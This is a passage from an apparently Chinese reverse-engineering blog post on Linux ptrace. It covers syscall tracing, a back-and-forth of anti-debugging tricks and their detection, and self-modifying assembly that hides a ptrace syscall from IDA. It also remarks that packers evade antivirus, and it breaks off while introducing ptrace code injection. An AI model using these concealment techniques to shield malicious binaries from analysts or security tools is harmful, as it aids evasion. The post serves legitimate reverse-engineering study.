class="line">#include&lt;unistd.h&gt;&#x2F;*引入fork函数的头文件*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;syscall.h&gt; &#x2F;* SYS_write *&#x2F;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    pid_t child;&#x2F;*定义子进程变量*&#x2F;</span><br><span class="line">    long orig_rax;&#x2F;&#x2F;定义rax寄存器的值的变量</span><br><span class="line">    int status;&#x2F;*定义进程状态变量*&#x2F;</span><br><span class="line">    int iscalling &#x3D; 0;&#x2F;*判断是否正在被调用*&#x2F;</span><br><span class="line">    struct user_regs_struct regs;&#x2F;*定义寄存器结构体数据类型*&#x2F;</span><br><span class="line">    child &#x3D; fork();&#x2F;*利用fork函数创建子进程*&#x2F;</span><br><span class="line">    if(child &#x3D;&#x3D; 0) </span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, 0, 0);&#x2F;&#x2F;发送信号给父进程表示已做好准备被跟踪（调试）</span><br><span class="line">        execl(&quot;&#x2F;bin&#x2F;ls&quot;, &quot;ls&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);&#x2F;*执行命令ls -l -h,注意，这里函数参数必须要要以NULL结尾来终止参数列表*&#x2F;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        while(1)</span><br><span class="line">        &#123;</span><br><span class="line">            wait(&amp;status);&#x2F;&#x2F;等待子进程发来信号或者子进程退出</span><br><span class="line">            if(WIFEXITED(status))&#x2F;&#x2F;WIFEXITED函数(宏)用来检查子进程是被ptrace暂停的还是准备退出</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            orig_rax &#x3D; ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, 0);&#x2F;&#x2F;获取rax值从而判断将要执行的系统调用号</span><br><span class="line">            if(orig_rax &#x3D;&#x3D; SYS_write)&#x2F;&#x2F;如果系统调用是write</span><br><span class="line">            &#123;    </span><br><span class="line">                ptrace(PTRACE_GETREGS, child, 0, &amp;regs);</span><br><span class="line">                if(!iscalling)</span><br><span class="line">                &#123;</span><br><span class="line">                    iscalling &#x3D; 1;</span><br><span class="line">                    printf(&quot;SYS_write call with %lld, %lld, %lld\n&quot;,regs.rdi, regs.rsi, regs.rdx);&#x2F;&#x2F;打印出系统调用write的各个参数内容</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;SYS_write call return %lld\n&quot;, regs.rax);&#x2F;&#x2F;打印出系统调用write函数结果的返回值</span><br><span class="line">                    iscalling &#x3D; 0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, 0, 0);&#x2F;&#x2F;PTRACE_SYSCALL,其作用是使内核在子进程进入和退出系统调用时都将其暂停</span><br><span class="line">            &#x2F;&#x2F;得到处于本次调用之后下次调用之前的状态</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3010865210.png"></p><p>在这个简单的c程序中，我们跟踪了excel()函数的执行状态，并把打印出相应执行中的一些寄存器的值，返回值等，当然这只是ptrace的部分功能，ptrace能做到的事情还有更多，比如还能修改内存，修改寄存器的值，插入字节码实现下断点的功能。</p><h3 id="2-反调试"><a href="#2-反调试" class="headerlink" title="2.反调试"></a>2.反调试</h3><p>我们直接通过攻防来学习ptrace反调试的应用</p><p>1.直接使用ptrace函数：</p><p><strong>攻防（防）：</strong></p><p>进程跟踪器，类似于gdb watch的调试方法， Linux 系统gdb等调试器，都是通过ptrace系统调用实现，ptrace系统调用有一个特性就是当前进程已经被追踪了，就不能被其他父进程追踪，所以只要我们设计的反调试程序开头就先执行一次<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>，当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1，就无法调试了。</p><p>看一段简单的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &#x3D;&#x3D;-1 )&#x2F;&#x2F;这里就直接先执行了ptrace(PTRACE_TRACEME, 0, 0, 0)，表示此程序已经被追踪</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace me！\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me！\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序正常的输出结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3101929216.png"></p><p>当我们用gdb调试的时候，将无法调试：<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1488349151.png"></p><p><strong>反转：（攻）</strong></p><p>那么我们如何来识别prtace反调试，检测程序中是否存在ptrace系统调用，如果我们识别到，我们就很容易通过IDA或者Binary Ninja把调用prtace地方修改成NOP，就能绕过这种反调试。</p><p>通过工具查看程序是否存在反调试，因为prtace是函数的调用，所以我们可以直接查看符号表来确定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">readelf -s helloword&#x2F;&#x2F;查看.symtab</span><br><span class="line">readelf -S helloword&#x2F;&#x2F;查看.dynsym</span><br><span class="line">objdump -T hellword&#x2F;&#x2F;查看.dynsym</span><br><span class="line">objdump -t hellword&#x2F;&#x2F;查看.symtab</span><br><span class="line">.......其他的查看符号表工具</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4229789843.png"></p><p><strong>反转：（防）</strong></p><p>我们可以通过删除符号表的选项，来隐藏对ptrace的调用，但只是针对.sysmtab表，不会去掉<code>.dynsym</code></p><p>可以用工具strip,也可以在链接阶段使用使用ld的<code>-s</code>和<code>-S</code>参数，使得连接器生成的输出文件时就不产生符号信息，-s<code>和</code>-S<code>的区别在于</code>-S<code>移除调试符号信息，而</code>-s移除所有符号信息。</p><p>同时，我们也可以在GCC中通过<code>-Wl,-s</code>和<code>-Wl,-S</code>来移除符号信息。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1054804442.png"></p><p>从图可以看到，即使使用strip 移除了符号表项信息，但是仍会保留.dynsym表的表项</p><p>.symtab和dynsym：</p><table><thead><tr><th>符号表类型</th><th>说明</th></tr></thead><tbody><tr><td>.symtab</td><td>包含大量的信息（包括全局符号global symbols）</td></tr><tr><td>.dynsym</td><td>只保留.symtab中的全局符号</td></tr></tbody></table><p>在可执行文件中，函数，变量都为符号，而符号表项所对应的就是地址（不牵扯glt，got表），.symtab和.dynsym这两个都是符号表，dynsym是symtab的较小版本，仅包含全局符号，而symtab会保护这个程序所有符号，因此，也可以在symtab中找到在dynsym中所拥有的符号，但是你会有个疑问:可执行文件明明只需要一个symtab就够了，为什么还要dynsym表？</p><p>ELF文件包含使用它们的进程在运行时所需的某些部分（例如代码和数据），这些部分被标记为必须的。链接器，调试器和其他此类工具需要其他许多部分，但正在运行的程序不需要这些部分。所以链接器生成ELF文件时，它将所有程序运行所必需的节收集到文件的一部分中，而所有程序运行不必需的节都放在其他位置。当操作系统加载ELF文件时，只有必需的部分被映射到内存中，不需要的部分保留在文件中，不需要的部分不会映射到内存，在内存中不可见。完整的符号表包含链接或调试文件所需的大量数据，而运行时则不需要。实际上，在可共享库和动态链接出现之前的日子里，在运行时不需要它们，所以为了节省运行内存，定义了第二个张表，为“ dynsym”。</p><p>因此，ELF文件有两个符号表，symtab包含所有内容，但是它不是程序运行必需的，可以剥离，并且没有运行的副作用，dynsym是不可剥离的，包含支持运行时操作所需的符号。</p><p>如果没有作任何处理，ptrace在.dynsym表中，运行时调用时需要进行重定位，所以我们无法删除dynsym表中对应符号表项。但是如果我们在编译时，静态链接库文件，ptrace符号就放在了symtab表中，我们就可以删除掉对应的符号表项了</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/83116522669.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/108225897.png"></p><p>我们再查看的时候，发现.symtab表没有任何信息！那么就真的意味着我们把ptrace隐藏了吗？</p><p><strong>反转：（攻）</strong></p><p>但是我们如果使用ida打开的话，在IDA FLIRT(库文件快速识别与鉴定技术)帮助下，只要找到对应的链接库的版本，生成.sig文件，依然能发现ptrace系统调用!</p><p><strong>反转：（防）</strong></p><p>如果我们给应用程序加壳的话，在没有脱壳的情况下，那么IDA FLIRT(库文件快速识别与鉴定技术)也无法分析出来，比如常见的upx之类的加壳程序！最好能加一个猛壳，不仅能反调试，也能过杀毒软件，多香！</p><p><strong>反转：（攻）</strong></p><p>诸如像upx这样的壳，我们使用PEID之类的工具可以轻松识别，脱壳就行，除非程序本身使用难以解包的自定义加壳程序，这样的猛壳！比较难脱。</p><p><strong>反转：（防）</strong></p><p>由于静态加载过于笨重了（可执行文件很大），不是长久之计，如果我们使用动态加载这项技术，就可以回到动态加载库文件（文件很小），并且ptrace将不会出现在.symtab和.dynsym表中。</p><p>动态加载是指在运行时加载库并检索库函数地址，我们需要dlopen加载库，dlsym解析函数地址，代码如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include&lt;dlfcn.h&gt;&#x2F;&#x2F;Linux动态库的显式调用</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    void *handle;&#x2F;&#x2F;定义句柄指针变量</span><br><span class="line">    long (*go)(enum __ptrace_request request, pid_t pid);&#x2F;&#x2F;定义函数指针变量</span><br><span class="line">    &#x2F;&#x2F;获取包含&#39;ptrace&#39;的库的句柄</span><br><span class="line">    handle &#x3D; dlopen (&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址</span><br><span class="line">    go &#x3D; dlsym(handle, &quot;ptrace&quot;);</span><br><span class="line">    if (go(PTRACE_TRACEME, 0) &lt; 0) &#123;</span><br><span class="line">        puts(&quot;being traced&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;not being traced&quot;);</span><br><span class="line">    &#x2F;&#x2F;关闭句柄</span><br><span class="line">    dlclose(handle);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译时记得加上选项-ldl，不然会报错！实际效果如下</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/846479426.png"></p><p>我们会发现，我们实实在在的把ptrace隐藏，而不是直接使用strip删除相应的符号表项。</p><p><strong>反转：（攻）</strong></p><p>但是我们使用ida打开依然会发现存在字符ptrace，或者直接跳到_rodata去找，因为ptrace是字符串常量，就放在__rodate(只读数据段)</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1005118859.png"></p><p>或者直接使用strings字符搜索</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/903051067.png"></p><p><strong>反转：（防）</strong></p><p>因为我们上一个使用了字符串，字符串是一个常量，常量不可以改变修改，且无法隐藏，那如果我们把ptrace定义为字符数组勒？把ptrace拆分成几个字符串</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include&lt;dlfcn.h&gt;&#x2F;&#x2F;Linux动态库的显式调用</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    void *handle;&#x2F;&#x2F;定义句柄指针变量</span><br><span class="line">    long (*go)(enum __ptrace_request request, pid_t pid);&#x2F;&#x2F;定义函数指针变量</span><br><span class="line">    char nice[] &#x3D; &quot;ptrace&quot;;&#x2F;&#x2F;定义字符串数组</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;获取包含&#39;ptrace&#39;的库的句柄</span><br><span class="line">    handle &#x3D; dlopen (&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址</span><br><span class="line">    go &#x3D; dlsym(handle, nice);</span><br><span class="line">    if (go(PTRACE_TRACEME, 0) &lt; 0) &#123;&#x2F;&#x2F;go(PTRACE_TRACEME, 0)相当于ptrace(PTRACE_TRACEME, 0)</span><br><span class="line">        puts(&quot;being traced&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;not being traced&quot;);</span><br><span class="line">    &#x2F;&#x2F;关闭句柄</span><br><span class="line">    dlclose(handle);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用strings字符搜索将无效</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2742249332.png"></p><p>使用IDA打开，也好像没有明显ptrace字符的特征：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3385230273.png"></p><p><strong>反转：（攻）</strong></p><p>如果我们用ida中的功能，把汇编代码转换成c语言伪代码昵？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3240894457.png"></p><p>况且，就算ptrace调用隐藏的再好，可执行程序也会导入相应的库文件加载ptrace()，也会泄露出蛛丝马迹！</p><p><strong>反转：（防）</strong></p><p>前面就说过，ptrace其实是一种系统调用，所以我们可以直接通过系统调用号，以及传入的相应的参数，就能越过库的封装，调用ptrace。</p><p>在x86的语法中，’int 0x80’是对32位Linux可执行文件进行系统调用的一种方法。系统调用号码放在EAX寄存器中，而前6个参数分别放在EBX，ECX，EDX，ESI，EDI和EBP中。通过查看系统调用表找到ptrace的系统调用号</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3558141121.png"></p><p>编写纯的汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .data</span><br><span class="line">    traced: db &quot;being traced&quot;, 0xA</span><br><span class="line">    tracedLen equ $-traced</span><br><span class="line">    normal: db &quot;not being traced&quot;, 0xA</span><br><span class="line">    normalLen equ $-normal</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;calling ptrace</span><br><span class="line">    mov ebx, 0x0</span><br><span class="line">    mov ecx, 0x0</span><br><span class="line">    mov edx, 0x0</span><br><span class="line">    mov eax, 0x1a</span><br><span class="line">    int 0x80 ; sys_ptrace</span><br><span class="line">    cmp eax, 0xFFFFFFFF;把返回值与-1做比较</span><br><span class="line">    jz debugger;eax值伪-1就跳转</span><br><span class="line"></span><br><span class="line">    mov edx, normalLen;正常输出</span><br><span class="line">    mov ecx, normal;&quot;not being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">    jmp exit</span><br><span class="line"></span><br><span class="line">debugger:</span><br><span class="line">    mov edx, tracedLen;被调试的时候输出</span><br><span class="line">    mov ecx, traced ;&quot;being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80 ; sys_exit</span><br></pre></td></tr></table></figure><p>或者直接内联汇编到c代码中（正常编译就可以使用）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">static __always_inline volatile long no_hacker()&#123;</span><br><span class="line">    int status &#x3D;0; &#x2F;&#x2F;定义返回值变量</span><br><span class="line">        &#x2F;&#x2F;内联汇编代码，系统调用ptrace，把eax寄存器的值赋给status变量</span><br><span class="line">         __asm__ volatile(&quot;mov $0x0,%%ebx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x0,%%ecx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x0,%%edx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x1a,%%eax\n\t&quot;</span><br><span class="line">                  &quot;int $0x80\n\t&quot;</span><br><span class="line">            :&quot;&#x3D;a&quot;(status)</span><br><span class="line">            :);</span><br><span class="line">     return status;&#x2F;&#x2F;这里把系统的调用的返回值作为no_hacke函数的返回值</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;    </span><br><span class="line">    if (no_hacker()&#x3D;&#x3D;-1)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace me！\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me！\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>纯汇编代码编译运行：</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2783546991.png"></p><p>尝试gdb调试</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/356951660.png"></p><p>可以用readelf工具查看符号表</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1033413410.png"></p><p>可以看到我们彻底脱离了库的范畴，将不会有库的调用特征！</p><p><strong>反转:（攻）</strong></p><p>但是牛逼的ida依然能给你标注出来？就问你难受不？</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4226237960.png"></p><p>其实这里稍微人为分析一下，也可以的，直接查看EAX寄存器的内容，对照系统调用号表，不难看出这是在系统调用ptrace，也有自动化工具，比如有大佬在Binary Ninja制作了一个插件，这个插件就是专门来查看二进制文件进行了那些系统调用的。<br>github地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;yellowbyte.github.io&#x2F;hiding-call-to-ptrace.html</span><br></pre></td></tr></table></figure><p><strong>反转：(防）</strong></p><p>引用“Self-Modifying Code“技术，顾名思义，就是二进制的可执行代码可以在运行时改变自己（代码，数据…….）。意思是说，我们可以让二进制代码在运行时写入系统调用指令，然后再执行它,这样我们就可以隐藏int 0x80的系统调用指令，因为在运行之前，根本就没有此指令,只有执行到特定的指令时，才会显现，起到很好的隐藏效果。</p><p>而在ELF文件标志格式中，程序中的代码和数据都是保存在.text  section中的，为了程序的稳定性和安全性，.text在默认编译的时候是可读可执行，但不可以写，所以必须在使用ld工具进行链接的时候得加上-N选项。</p><p>纯汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .data</span><br><span class="line">    traced: db &quot;being traced&quot;, 0xA</span><br><span class="line">    tracedLen equ $-traced</span><br><span class="line">    normal: db &quot;not being traced&quot;, 0xA</span><br><span class="line">    normalLen equ $-normal</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;显示ptrace </span><br><span class="line">    mov edi, systemcall;</span><br><span class="line">    mov ax, 0x80cd;“0x80cd”是与系统调用指令“ int 0x80”相对应的操作码</span><br><span class="line">    stosw;将AX寄存器的内容存储到EDI寄存器指向的内存中</span><br><span class="line">    ;calling ptrace</span><br><span class="line">    mov ebx, 0x0</span><br><span class="line">    mov ecx, 0x0</span><br><span class="line">    mov edx, 0x0</span><br><span class="line">    mov eax, 0x1a</span><br><span class="line">systemcall:</span><br><span class="line">    xor eax, ebx;这条指令将被int 0x80覆盖</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jl debugger</span><br><span class="line">    </span><br><span class="line">    mov edx, normalLen;正常输出</span><br><span class="line">    mov ecx, normal;&quot;not being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">    jmp exit</span><br><span class="line">debugger:</span><br><span class="line">    mov edx, tracedLen;被调试的时候输出</span><br><span class="line">    mov ecx, traced ;&quot;being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">exit:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80 ; sys_exit</span><br></pre></td></tr></table></figure><p>编译运行：</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/8088311688.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2264018565499.png"></p><p>直接用ida打开：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/237384718466.png"></p><p>很明显，静态分析工具ida也没有识别出来系统调用！<br>通过readelf查看.text段的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/292593659766.png"></p><p>然后我们用python中的lief库进行重写，把.text section权限重写回来为AX</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/365630462666.png"></p><p>我们查看新保存的文件new_hacker .text section的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3333688238.png"></p><p>一次很nice的换装就搞定了，当然我这里只是通过纯汇编代码验证可行性，在实际的利用场景众，内联汇编插入代码，可能会有更多的混淆指令什么的，让逆向过程更为艰难！</p><p><strong>反转：（攻）</strong></p><p>虽然静态分析工具ida已经无法分析出系统调用了，但是这依然挡不住strace动态分析，一些有经验的逆向分析人员一看到0x80cd这样的机器码，可能比工具分析都还要快！</p><p>而且发现ptrace并不是只能专注与它本身，就是我一定要找出什么ptrace什么字符串啊，什么的，我们完全可以通过一些共同的特点来，比如ptrace在反调试中，如果遇到调试，就会返回-1，程序退出，我们完全可以跟进exit系统的调用。</p><h3 id="3-代码注入"><a href="#3-代码注入" class="headerlink" title="3.代码注入"></a>3.代码注入</h3><p>ptrace是Unix系列系统的系统调用之一，其主要功能是实现对进程的追踪，对目标进程，进行流程控制，用户寄存器值读取和写入操作，内存进行读取和修改。这样的特性，就非常适合，用于编写实现，远程代码注入到进程。</p><p>而大多数病毒也是利用到这个特性，实现自用空间注入，rip位置直接注入，text段与data段之间的空隙注入，而且gdb实现单步调试的原理也是在每条指令后面插入一个int3。</p><p>需要知道request几个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_POKETEXT, PTRACE_POKEDATA</span><br><span class="line">往内存地址中写入一个字节。内存地址由addr给出。</span><br><span class="line"></span><br><span class="line">PTRACE_PEEKTEXT, PTRACE_PEEKDATA</span><br><span class="line">从内存地址中读取一个字节，内存地址由addr给出</span><br><span class="line"></span><br><span class="line">PTRACE_ATTACH</span><br><span class="line">跟踪指定pid 进程</span><br><span class="line"></span><br><span class="line">PTRACE_GETREGS</span><br><span class="line">读取所有寄存器的值</span><br><span class="line"></span><br><span class="line">PTRACE_CONT</span><br><span class="line"></span><br><span class="line">继续执行示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。</span><br><span class="line"></span><br><span class="line">PTRACE_SETREGS</span><br><span class="line">设置寄存器</span><br><span class="line"></span><br><span class="line">PTRACE_DETACH</span><br><span class="line">结束跟踪</span><br></pre></td></tr></table></figure><p>用ptrace来实现gdb调试原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 